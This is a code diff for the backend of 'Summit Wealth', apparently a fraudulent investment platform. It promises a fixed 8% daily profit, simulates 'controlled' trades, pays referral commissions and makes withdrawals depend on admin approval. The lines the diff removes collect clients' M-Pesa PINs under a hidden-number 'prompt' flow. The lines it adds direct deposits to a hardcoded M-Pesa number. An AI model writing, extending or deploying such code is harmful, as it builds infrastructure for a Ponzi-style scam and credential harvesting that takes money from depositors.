@@ -1,5 +1,5 @@
 """
-Summit Wealth v5.7+ - M-Pesa PIN Flow (Updated)
+Summit Wealth v5.7 - $8 PROFIT PER $100 BALANCE (8% daily)
 - Scheduler starts at module level (works with gunicorn on Render)
 - One controlled trade per client per day
 - Trade profit scales: $8 per $100 of balance
@@ -9,7 +9,14 @@ Summit Wealth v5.7+ - M-Pesa PIN Flow (Updated)
 - Min deposit: $100
 - Withdrawal deducted only on admin approval
 - Database: PostgreSQL (psycopg2)
-- M-Pesa PIN-based deposit flow: No number shown to client, only PIN entry
+- FIX v5.5: total_withdrawals now correctly summed in client_summary
+            both WITHDRAWAL and REFERRAL_WITHDRAWAL counted
+            referral withdrawal rejection now restores ref_balance
+            admin clients list now includes total_deposits/withdrawals
+- FIX v5.6: referral withdrawal now requires referred user to have made a deposit
+- NEW v5.7: M-Pesa added as deposit payment method (number: 0757979633)
+            M-Pesa deposits capture KES amount sent + M-Pesa transaction code
+            stored in transaction note for admin verification
 """
 
 import os, hashlib, secrets, datetime, uuid, logging, threading, random
@@ -70,7 +77,7 @@ TRADE_HOUR           = int(os.environ.get("TRADE_HOUR", "5"))
 TRADE_SYMBOL         = os.environ.get("TRADE_SYMBOL", "BTCUSDT")
 CHECK_INTERVAL       = 60
 
-# ── UPDATED v5.7+: M-Pesa PIN Flow ──────────────────────────────────────────
+# ── NEW v5.7: M-Pesa added ────────────────────────────────────────────────────
 NETWORKS = {
     "TRC20": {"network": "TRX"},
     "BEP20": {"network": "BSC"},
@@ -81,7 +88,7 @@ MANUAL_WALLETS = {
     "TRC20":  os.environ.get("WALLET_TRC20", ""),
     "BEP20":  os.environ.get("WALLET_BEP20", ""),
     "ERC20":  os.environ.get("WALLET_ERC20", ""),
-    "MPESA":  os.environ.get("MPESA_NUMBER", "0757979633"),  # Hidden from clients
+    "MPESA":  os.environ.get("MPESA_NUMBER", "0757979633"),
 }
 
 REFERRAL_COMMISSION_PCT = 0.16
@@ -722,17 +729,18 @@ def client_deposit_address():
     wallet = MANUAL_WALLETS.get(net,"")
     if not wallet: return err("Deposit address not configured. Contact support.")
 
-    # ── UPDATED v5.7+: M-Pesa PIN prompt response (no number shown) ──────────
+    # ── NEW v5.7: M-Pesa specific response ───────────────────────────────────
     if net == "MPESA":
         return ok({
-            "address":      "hidden",  # Don't reveal the actual number to client
+            "address":      wallet,
             "network":      net,
-            "mode":         "prompt",
-            "label":        "M-Pesa PIN",
+            "mode":         "manual",
+            "label":        "M-Pesa Number",
             "instructions": (
-                "A prompt will be sent to your registered M-Pesa phone number. "
-                "Enter your M-Pesa PIN to complete the payment. "
-                "Your deposit will be credited after admin verification."
+                f"Send to M-Pesa number {wallet}. "
+                "Use your full name as the reference. "
+                "Enter the exact KES amount you sent and your M-Pesa transaction code, "
+                "then submit — admin will confirm and credit your account in USD."
             ),
         })
 
@@ -746,19 +754,20 @@ def client_deposit_pending():
     amt       = float(d.get("amount", 0))
     net       = d.get("network","TRC20").upper()
     addr      = d.get("address","").strip()
-    # ── UPDATED v5.7+: M-Pesa PIN flow (no KES amount needed) ──────────────
-    mpesa_pin = d.get("mpesa_pin","").strip()
+    # ── NEW v5.7: M-Pesa extra fields ────────────────────────────────────────
+    kes_amt   = d.get("kes_amount","").strip()
+    mpesa_ref = d.get("mpesa_ref","").strip()
 
     if amt < 100: return err("Minimum deposit is $100")
     if not addr:  return err("Deposit address is required")
 
-    # Build note for admin
+    # Build note for admin — M-Pesa deposits include KES amount + transaction code
     note = None
     if net == "MPESA":
-        if mpesa_pin:
-            note = f"M-Pesa PIN entered. Amount: ${amt}. Admin to verify STK/USSD transaction."
-        else:
-            note = "M-Pesa deposit initiated via prompt"
+        parts = []
+        if kes_amt:   parts.append(f"KES sent: {kes_amt}")
+        if mpesa_ref: parts.append(f"M-Pesa ref: {mpesa_ref}")
+        note = " | ".join(parts) if parts else "M-Pesa deposit"
 
     conn = get_db()
     cur  = conn.cursor()
@@ -775,7 +784,7 @@ def client_deposit_pending():
     conn.commit()
     cur.close(); conn.close()
     return ok({"reference": ref,
-               "message": "M-Pesa prompt sent to your registered phone number. Enter your PIN to complete payment. Awaiting admin confirmation."})
+               "message": "Deposit submitted. Awaiting admin confirmation."})
 
 # ── WITHDRAWAL ────────────────────────────────────────────────────────────────
 @app.route("/api/client/withdraw", methods=["POST"])
@@ -1154,7 +1163,7 @@ start_scheduler()
 
 if __name__ == "__main__":
     print("\n" + "="*60)
-    print("   Summit Wealth v5.7+ — M-Pesa PIN FLOW")
+    print("   Summit Wealth v5.7 — $8 PROFIT PER $100 BALANCE")
     print("="*60)
     print(f"   URL    : http://127.0.0.1:8080")
     print(f"   Client : john@test.com  / demo1234")
@@ -1163,6 +1172,7 @@ if __name__ == "__main__":
     print(f"   Symbol : {TRADE_SYMBOL}")
     print(f"   Min Dep: $100  |  Min Withdrawal: $1,000  |  Ref Withdrawal: $16")
     print(f"   Binance: {'CONNECTED ✓' if bnb else 'fallback prices'}")
-    print(f"   M-Pesa : PIN-based prompt (Number: {MANUAL_WALLETS['MPESA']} - hidden from clients)")
+    print(f"   TRC20  : {'SET ✓' if MANUAL_WALLETS['TRC20'] else 'NOT SET ✗'}")
+    print(f"   M-Pesa : {MANUAL_WALLETS['MPESA']} ✓")
     print("="*60 + "\n")
     app.run(debug=False, port=8080, host="0.0.0.0")
